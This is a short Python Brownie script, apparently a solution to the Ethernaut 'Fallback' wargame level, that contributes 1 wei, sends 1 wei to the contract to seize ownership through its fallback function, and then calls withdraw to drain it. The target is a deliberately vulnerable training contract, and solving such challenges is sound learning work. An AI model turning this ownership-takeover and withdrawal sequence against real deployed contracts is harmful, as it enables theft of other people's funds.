## Another solution, instead of using interfaces. However, require you to import the fallback.sol file to get the address.

from brownie import accounts,config, Fallback, network,interface

def deploy_fallback():

    #Ethernaut Instance
    contract = '0xa5580F70B6DE74672A06d6DF56464CD1c7268dc8'

    #Player account
    account = accounts.add(config["wallets"]["from_key"])

    fallback = interface.IFallback(contract)
    print(fallback)
    print(type(fallback),'A deployed contract that is not part of a Brownie project.')

    #get fallback contract at address
    FallbackContract = Fallback.at(contract)
    print(type(FallbackContract),'A deployed contract that is part of an active Brownie project. Along with making calls and transactions, \
                                this object allows access to Brownie’s full range of debugging and testing capability.')

    #calling Fallback.sol contribute function and sending 1 wei
    FallbackContract.contribute({"from":account,"amount":1})

    # In a development environment, it is possible to send transactions from an address without having that addresses private key. 
    # To create an Account object from an arbitrary address, use the Accounts.at method and include force=True as a keyword argument:

    fbAccount = accounts.at(FallbackContract.address, force=True)

    # transfer 1 wei into contract
    account.transfer(fbAccount, 1)

    FallbackContract.withdraw({"from": account})
    print('done')

def main():
    deploy_fallback()
